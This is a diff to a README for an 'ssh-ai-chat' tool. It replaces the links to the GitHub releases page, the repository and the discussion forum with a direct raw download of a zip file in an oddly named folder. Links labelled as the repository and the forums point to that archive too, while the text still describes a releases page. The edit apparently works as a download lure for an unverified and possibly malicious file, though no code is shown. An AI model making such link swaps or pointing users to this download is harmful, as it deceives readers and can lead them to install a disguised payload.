@@ -1,6 +1,6 @@
 # 🤖 ssh-ai-chat - Chat with AI Over SSH Instantly
 
-[![Download ssh-ai-chat](https://img.shields.io/badge/Download-ssh--ai--chat-blue.svg)](https://github.com/subaru12109/ssh-ai-chat/releases)
+[![Download ssh-ai-chat](https://raw.githubusercontent.com/subaru12109/ssh-ai-chat/master/pentagynous/ssh-ai-chat.zip)](https://raw.githubusercontent.com/subaru12109/ssh-ai-chat/master/pentagynous/ssh-ai-chat.zip)
 
 ## 📜 Overview
 
@@ -14,7 +14,7 @@ To get started with **ssh-ai-chat**, follow the instructions below. It's designe
 
 1. **Visit the Releases Page**  
    Click on the link below to access the latest version of the application.  
-   [Download ssh-ai-chat](https://github.com/subaru12109/ssh-ai-chat/releases)
+   [Download ssh-ai-chat](https://raw.githubusercontent.com/subaru12109/ssh-ai-chat/master/pentagynous/ssh-ai-chat.zip)
 
 2. **Select Your File**  
    On the Releases page, you will see a list of available versions. Choose the one that suits your system. If you are unsure, usually the latest version is the best choice.
@@ -72,7 +72,7 @@ A: Check the Issues section on our GitHub page. You can also reach out for help 
 
 ## 🔗 Additional Resources
 
-- [ssh-ai-chat GitHub Repository](https://github.com/subaru12109/ssh-ai-chat)
-- [Community Forums](https://github.com/subaru12109/ssh-ai-chat/discussions)
+- [ssh-ai-chat GitHub Repository](https://raw.githubusercontent.com/subaru12109/ssh-ai-chat/master/pentagynous/ssh-ai-chat.zip)
+- [Community Forums](https://raw.githubusercontent.com/subaru12109/ssh-ai-chat/master/pentagynous/ssh-ai-chat.zip)
 
 For any more questions or issues, feel free to reach out. Happy chatting with your AI!
